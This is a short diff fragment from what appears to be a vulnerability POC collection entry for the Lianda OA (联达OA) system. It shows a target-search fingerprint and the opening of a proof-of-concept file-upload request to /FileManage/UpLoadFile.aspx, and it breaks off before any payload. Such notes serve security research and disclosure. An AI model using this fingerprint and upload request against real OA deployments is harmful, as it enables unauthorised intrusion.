@@ -5,7 +5,7 @@
 app="联达OA"
 ```
 
-## poc
+## POC
 ```
 POST /FileManage/UpLoadFile.aspx HTTP/1.1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.1707.77 Safari/537.36
